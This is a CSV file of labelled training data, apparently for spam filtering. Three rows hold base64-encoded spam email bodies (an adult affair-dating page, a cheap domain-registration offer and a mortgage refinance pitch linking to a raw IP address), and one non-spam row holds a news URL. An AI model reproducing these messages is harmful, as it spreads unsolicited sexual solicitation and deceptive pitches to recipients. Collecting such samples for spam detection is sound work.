spam_label,text,text_cleaned
1,PEhUTUw+DQo8SEVBRD4NCiAgIA0KICAgPFRJVExFPk1hcnJpZWQgQnV0IExv bmVseTwvVElUTEU+DQo8L0hFQUQ+DQo8Qk9EWSBCR0NPTE9SPSIjRkZGRkZG IiBMSU5LPSIjRkYwMDAwIiBWTElOSz0iI0ZGMDAwMCIgQUxJTks9IiNGRjAw MDAiPg0KDQo8UCBBTElHTj0iY2VudGVyIj4gPElNRyBCT1JERVI9IjAiIFNS Qz0iaHR0cDovL3d3dy5wYWdlNGxpZmUub3JnL3VzZXJzL3h4eGRhdGluZy9t YXJyaWVkYW5kbG9uZWx5L2ltYWdlcy9sb2dvLmpwZyIgV0lEVEg9IjUwMCIg SEVJR0hUPSIxOTEiPiZuYnNwOyAmbmJzcDsgPC9QPg0KPENFTlRFUj4NCiAg PFRBQkxFIENFTExTUEFDSU5HPTUgQ0VMTFBBRERJTkc9NSBCR0NPTE9SPSIj NjY2Njk5IiA+DQogICAgPFRSPg0KPFREPjxJTUcgU1JDPSJodHRwOi8vd3d3 LnBhZ2U0bGlmZS5vcmcvdXNlcnMveHh4ZGF0aW5nL21hcnJpZWRhbmRsb25l bHkvcDcwNi5qcGciIEJPUkRFUj0wIEhFSUdIVD0xODAgV0lEVEg9MTIwPjwv VEQ+DQoNCjxURD48SU1HIFNSQz0iaHR0cDovL3d3dy5wYWdlNGxpZmUub3Jn L3VzZXJzL3h4eGRhdGluZy9tYXJyaWVkYW5kbG9uZWx5L3A3MDQuanBnIiBC T1JERVI9MCBIRUlHSFQ9MTgwIFdJRFRIPTEyMD48L1REPg0KDQo8VEQ+PElN RyBTUkM9Imh0dHA6Ly93d3cucGFnZTRsaWZlLm9yZy91c2Vycy94eHhkYXRp bmcvbWFycmllZGFuZGxvbmVseS9wNzA1LmpwZyIgQk9SREVSPTAgSEVJR0hU PTE4MCBXSURUSD0xMjA+PC9URD4NCg0KPFREPjxJTUcgU1JDPSJodHRwOi8v d3d3LnBhZ2U0bGlmZS5vcmcvdXNlcnMveHh4ZGF0aW5nL21hcnJpZWRhbmRs b25lbHkvcDExOTliLmdpZiIgQk9SREVSPTAgSEVJR0hUPTE4MCBXSURUSD0x MjA+PC9URD4NCjwvVFI+DQo8L1RBQkxFPjwvQ0VOVEVSPg0KDQo8QlI+Jm5i c3A7DQo8Q0VOVEVSPjxUQUJMRSBDT0xTPTEgV0lEVEg9IjUwMCIgSEVJR0hU PSI2MDAiID4NCjxUUj4NCjxURD48Rk9OVCBDT0xPUj0iI0ZGNjY2NiI+PEEg SFJFRj0iaHR0cDovL3d3dy5wYWdlNGxpZmUub3JnL3VzZXJzL3h4eGRhdGlu Zy9tYXJyaWVkYW5kbG9uZWx5L3ByZXZpZXcuaHRtIj5FTlRFUg0KVEhFIFdP UkxEIEZBTU9VUzwvQT4gPC9GT05UPjxGT05UIFNJWkU9IjYiIENPTE9SPSIj RkYwMEZGIj5NYXJyaWVkIEJ1dCBMb25lbHk8L0ZPTlQ+PEI+PEk+PEZPTlQg Q09MT1I9IiNGRjAwRkYiIFNJWkU9IjUiPiE8L0ZPTlQ+PC9JPjwvQj48Rk9O VCBDT0xPUj0iI0ZGMDBGRiI+DQo8L0ZPTlQ+DQo8VUw+DQo8TEk+DQpBIHdv cmxkd2lkZSBub24tcHJvZml0IG9yZ2FuaXphdGlvbiBmb3VuZGVkIGFuZCBt YW5hZ2VkIGV4Y2x1c2l2ZWx5IGJ5DQp3b21lbjwvTEk+DQoNCjxMST4NCkZl YXR1cmluZyBvbmx5IFJFQUwgYXR0YWNoZWQgd29tZW4gaW4gc2VhcmNoIG9m IFJFQUwgU2V4IE9uIFRoZSBTaWRlIG5hdGlvbndpZGUNCmFuZCBpbiAyMCBj b3VudHJpZXM8L0xJPg0KDQo8TEk+DQpCYXNlZCBpbiBMb3MgQW5nZWxlcywg Q2FsaWZvcm5pYTogVGhlIFdvcmxkIENhcGl0YWwgZm9yIFNleCBPbiBUaGUg U2lkZSZuYnNwOzwvTEk+DQo8L1VMPg0KPEZPTlQgQ09MT1I9IiNGRjAwMDAi PkZBQ1Q6PC9GT05UPg0KPFVMPg0KPExJPg0KT3ZlciAyNyBNaWxsaW9uIHZp c2l0b3JzIGluIGxlc3MgdGhhbiAyIHllYXJzIHdpdGhvdXQgYW55IGNvbW1l cmNpYWwgYWR2ZXJ0aXNpbmcNCm1lYW5zLiAiVGhlIHdvcmQgc3ByZWFkcyBm YXN0Ii48L0xJPg0KPC9VTD4NCiZuYnNwOzxGT05UIENPTE9SPSIjRkYwMDAw Ij5MRUdBTCBOT1RJQ0U8L0ZPTlQ+DQo8VUw+DQo8TEk+DQpUaGlzIHNpdGUg Y29udGFpbnMgYWR1bHQgb3JpZW50ZWQgbWF0ZXJpYWwuIElmIHlvdSBmaW5k IHRoaXMgbWF0ZXJpYWwgdG8NCmJlIG9mZmVuc2l2ZSBvciBhcmUgdW5kZXIg dGhlIGFnZSBvZiAxOCB5ZWFycyAob3IgMjEgeWVhcnMgZGVwZW5kaW5nIG9u DQpsb2NhbCBsYXdzKSwgb3IgaXQgaXMgaWxsZWdhbCB3aGVyZSB5b3UgYXJl LCB0aGVuIHlvdSBtdXN0IExFQVZFIHRoaXMgc2l0ZQ0KTk9XISZuYnNwOzwv TEk+DQoNCjxMST4NCkJ5IGVudGVyaW5nIHRoaXMgc2l0ZSB5b3UgZGVjbGFy ZSB1bmRlciBwZW5hbHR5IG9mIHBlcmp1cnkgdGhhdCB5b3UgYXJlDQphYm92 ZSB0aGUgYWdlIGxpbWl0IGFuZCBkbyBub3QgZmluZCB0aGlzIG1hdGVyaWFs IG9mZmVuc2l2ZS4gWW91IHdpbGwgYWxzbw0Kbm90IGhvbGQgdXMgbGlhYmxl IGZvciBhbnkgZGFtYWdlcyBvciBwZXJzb25hbCBkaXNjb21mb3J0LiZuYnNw OzwvTEk+DQoNCjxMST4NCkkgYW0gYW4gYWR1bHQgb3ZlciB0aGUgYWdlIG9m IDE4IHllYXJzIChvciAyMSB5ZWFycyBkZXBlbmRpbmcgb24gbG9jYWwNCmdv dmVybmluZyBsYXdzIHJlbGF0aW5nIHRvIGV4cGxpY2l0IHNleHVhbCBtYXRl cmlhbCkuPC9MST4NCg0KPExJPg0KSSB3aWxsIG5vdCBhbGxvdyBhbnlvbmUg dW5kZXIgdGhlIGxlZ2FsIGFnZSB3aGljaCBpcyBkZXRlcm1pbmVkIGFzIGFi b3ZlDQp0byBoYXZlIGFjY2VzcyB0byBhbnkgb2YgdGhlIG1hdGVyaWFscyBj b250YWluZWQgd2l0aGluIHRoaXMgc2l0ZS48L0xJPg0KDQo8TEk+DQpJIGFt IHZvbHVudGFyaWx5IGNvbnRpbnVpbmcgb24gd2l0aCB0aGlzIHNpdGUsIEkg dW5kZXJzdGFuZCBJIHdpbGwgYmUgZXhwb3NlZA0KdG8gc2V4dWFsbHkgZXhw bGljaXQgbWF0ZXJpYWwgaW5jbHVkaW5nIHBpY3R1cmVzLCBzdG9yaWVzICwg dmlkZW9zIGFuZA0KZ3JhcGhpY3MuPC9MST4NCg0KPExJPg0KSSB3aWxsIG5v dCBob2xkIHlvdSByZXNwb25zaWJsZSBmb3IgYW55IGRhbWFnZXMgb3Igdmlv bGF0aW9ucyB0aGF0IHlvdQ0KbWF5IGhhdmUgY2F1c2VkLjwvTEk+DQo8L1VM Pg0KDQo8Q0VOVEVSPg0KPFA+PEJSPjxCPjxGT05UIFNJWkU9Nz48QSBIUkVG PSJodHRwOi8vd3d3LnBhZ2U0bGlmZS5vcmcvdXNlcnMveHh4ZGF0aW5nL21h cnJpZWRhbmRsb25lbHkvcHJldmlldy5odG0iPkVOVEVSDQpTSVRFPC9BPjwv Rk9OVD48L0I+PC9DRU5URVI+DQo8L1REPg0KPC9UUj4NCjwvVEFCTEU+PC9D RU5URVI+DQoNCjxQIEFMSUdOPSJjZW50ZXIiPiZuYnNwOzwvUD4NCg0KPC9C T0RZPg0KPC9IVE1MPg0KODIxNmpSRVg5LTc4NXZGako1N2wxOA==,
1,eyVSQU5EfQ0KUFVCTElDIEFOTk9VTkNFTUVOVDoNCg0KVGhlIG5ldyBkb21h aW4gbmFtZXMgYXJlIGZpbmFsbHkgYXZhaWxhYmxlIHRvIHRoZSBnZW5lcmFs IHB1YmxpYyBhdCBkaXNjb3VudCBwcmljZXMuIE5vdyB5b3UgY2FuIHJlZ2lz dGVyIG9uZSBvZiB0aGUgZXhjaXRpbmcgbmV3IC5CSVogb3IgLklORk8gZG9t YWluIG5hbWVzLCBhcyB3ZWxsIGFzIHRoZSBvcmlnaW5hbCAuQ09NIGFuZCAu TkVUIG5hbWVzIGZvciBqdXN0ICQxNC45NS4gVGhlc2UgYnJhbmQgbmV3IGRv bWFpbiBleHRlbnNpb25zIHdlcmUgcmVjZW50bHkgYXBwcm92ZWQgYnkgSUNB Tk4gYW5kIGhhdmUgdGhlIHNhbWUgcmlnaHRzIGFzIHRoZSBvcmlnaW5hbCAu Q09NIGFuZCAuTkVUIGRvbWFpbiBuYW1lcy4gVGhlIGJpZ2dlc3QgYmVuZWZp dCBpcyBvZi1jb3Vyc2UgdGhhdCB0aGUgLkJJWiBhbmQgLklORk8gZG9tYWlu IG5hbWVzIGFyZSBjdXJyZW50bHkgbW9yZSBhdmFpbGFibGUuIGkuZS4gaXQg d2lsbCBiZSBtdWNoIGVhc2llciB0byByZWdpc3RlciBhbiBhdHRyYWN0aXZl IGFuZCBlYXN5LXRvLXJlbWVtYmVyIGRvbWFpbiBuYW1lIGZvciB0aGUgc2Ft ZSBwcmljZS4gIFZpc2l0OiBodHRwOi8vd3d3LmFmZm9yZGFibGUtZG9tYWlu cy5jb20gdG9kYXkgZm9yIG1vcmUgaW5mby4NCiANClJlZ2lzdGVyIHlvdXIg ZG9tYWluIG5hbWUgdG9kYXkgZm9yIGp1c3QgJDE0Ljk1IGF0OiBodHRwOi8v d3d3LmFmZm9yZGFibGUtZG9tYWlucy5jb20vICBSZWdpc3RyYXRpb24gZmVl cyBpbmNsdWRlIGZ1bGwgYWNjZXNzIHRvIGFuIGVhc3ktdG8tdXNlIGNvbnRy b2wgcGFuZWwgdG8gbWFuYWdlIHlvdXIgZG9tYWluIG5hbWUgaW4gdGhlIGZ1 dHVyZS4NCiANClNpbmNlcmVseSwNCiANCkRvbWFpbiBBZG1pbmlzdHJhdG9y DQpBZmZvcmRhYmxlIERvbWFpbnMNCg0KDQpUbyByZW1vdmUgeW91ciBlbWFp bCBhZGRyZXNzIGZyb20gZnVydGhlciBwcm9tb3Rpb25hbCBtYWlsaW5ncyBm cm9tIHRoaXMgY29tcGFueSwgY2xpY2sgaGVyZToNCmh0dHA6Ly93d3cuY2Vu dHJhbHJlbW92YWxzZXJ2aWNlLmNvbS9jZ2ktYmluL2RvbWFpbi1yZW1vdmUu Y2dpDQozMQ0KDQoNCg0KDQoNCg0KDQoNClswOTg0b0lhUzctMjM2bUV3QDE1 XQ0K,
1,PHRhYmxlIHdpZHRoPSI3MTUiPg0KICA8dHI+DQogICAgPHRkIHZBbGlnbj0i dG9wIiBhbGlnbj0ibGVmdCIgd2lkdGg9IjUxMSI+DQogICAgICA8Zm9udCBj b2xvcj0iI0ZGRkZGRiI+d3lvbWluZzwvZm9udD4NCiAgICAgIDxibG9ja3F1 b3RlPg0KICAgICAgICA8Zm9udCBjb2xvcj0ibmF2eSIgc2l6ZT0iNCI+PGZv bnQgZmFjZT0iYXJpYWwiIGNvbG9yPSJyZWQiIHNpemU9IjMiPjxiPjxpPiZx dW90O05vdw0KICAgICAgICBpcyB0aGUgdGltZSB0byB0YWtlIGFkdmFudGFn ZSBvZiBmYWxsaW5nIGludGVyZXN0IHJhdGVzISBUaGVyZSBpcyBubw0KICAg ICAgICBhZHZhbnRhZ2UgaW4gd2FpdGluZyBhbnkgbG9uZ2VyLiZxdW90Ozwv aT48L2I+PGJyPg0KICAgICAgICA8YnI+DQogICAgICAgIDwvZm9udD48Zm9u dCBzaXplPSIzIj5SZWZpbmFuY2Ugb3IgY29uc29saWRhdGUgaGlnaCBpbnRl cmVzdCBjcmVkaXQgY2FyZA0KICAgICAgICBkZWJ0IGludG8gYSBsb3cgaW50 ZXJlc3QgbW9ydGdhZ2UuIE1vcnRnYWdlIGludGVyZXN0IGlzIHRheCBkZWR1 Y3RpYmxlLA0KICAgICAgICB3aGVyZWFzIGNyZWRpdCBjYXJkIGludGVyZXN0 IGlzIG5vdC48YnI+DQogICAgICAgIDxicj4NCiAgICAgICAgWW91IGNhbiBz YXZlIHRob3VzYW5kcyBvZiBkb2xsYXJzIG92ZXIgdGhlIGNvdXJzZSBvZiB5 b3VyIGxvYW4gd2l0aCBqdXN0DQogICAgICAgIGEgMC4yNSUgZHJvcCBpbiB5 b3VyIHJhdGUhPGJyPg0KICAgICAgICA8YnI+DQogICAgICAgIE91ciBuYXRp b253aWRlIG5ldHdvcmsgb2YgbGVuZGVycyBoYXZlIGh1bmRyZWRzIG9mIGRp ZmZlcmVudCBsb2FuDQogICAgICAgIHByb2dyYW1zIHRvIGZpdCB5b3VyIGN1 cnJlbnQgc2l0dWF0aW9uOg0KICAgICAgICA8YmxvY2txdW90ZT4NCiAgICAg ICAgICA8Zm9udCBjb2xvcj0icmVkIj48Yj4NCiAgICAgICAgICA8dWw+DQog ICAgICAgICAgICA8bGk+UmVmaW5hbmNlDQogICAgICAgICAgICA8bGk+U2Vj b25kIE1vcnRnYWdlDQogICAgICAgICAgICA8bGk+RGVidCBDb25zb2xpZGF0 aW9uDQogICAgICAgICAgICA8bGk+SG9tZSBJbXByb3ZlbWVudA0KICAgICAg ICAgICAgPGxpPlB1cmNoYXNlPC9saT4NCiAgICAgICAgICA8L3VsPg0KICAg ICAgICAgIDwvYj4NCiAgICAgICAgICA8L2Jsb2NrcXVvdGU+DQogICAgICAg IDwvZm9udD4NCiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+PGZvbnQgc2l6 ZT0iNCI+TGV0DQogICAgICAgIHVzIGRvIHRoZSBzaG9wcGluZyBmb3IgeW91 Li4uPGEgaHJlZj0iaHR0cDovLzIxMS45MS4yMC4xNjMvaG9zdC9Zb3VyQXBw cm92ZWQvIiB0YXJnZXQ9Il9ibGFuayI+SVQgSVMgRlJFRSE8YnI+DQogICAg ICAgIENMSUNLIEhFUkUmcXVvdDs8L2E+PC9mb250PjwvcD4NCiAgICAgICAg PHAgYWxpZ249ImNlbnRlciI+Jm5ic3A7PC9wPg0KICAgICAgICA8cCBhbGln bj0iY2VudGVyIj4mbmJzcDs8L3A+DQogICAgICAgIDxwIGFsaWduPSJjZW50 ZXIiPiZuYnNwOzwvcD4NCiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+Jm5i c3A7PC9wPjwvZm9udD48L2ZvbnQ+PHAgYWxpZ249ImNlbnRlciI+PGZvbnQg c2l6ZT0iNCIgY29sb3I9IiMwMDAwODAiPlRvDQogICAgICBiZSByZW1vdmVk IGZyb20gb3VyIG1haWxpbmcgbGlzdCA8YSBocmVmPSJodHRwOi8vMjExLjkx LjIwLjE2My9ob3N0L3JlbW92ZS8iPkNsaWNrDQogICAgICBIZXJlPC9hPjwv Zm9udD48L3A+DQogICAgICAgIDxmb250IGNvbG9yPSJuYXZ5IiBzaXplPSI0 Ij48Zm9udCBzaXplPSIzIj4NCiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+ Jm5ic3A7PC9wPg0KMzY0Mm1jcEM1LTg4ME53cUs4MDA2VGJ6VDctOTk4Ynda dzU4NzVBeUNMMi0wNTdZTEtTODgwM25kT0s3LTQ3N0RsVGkxOTE4bm1sNzA=,
0,http://www.post-gazette.com/columnists/20020905brian5.asp,
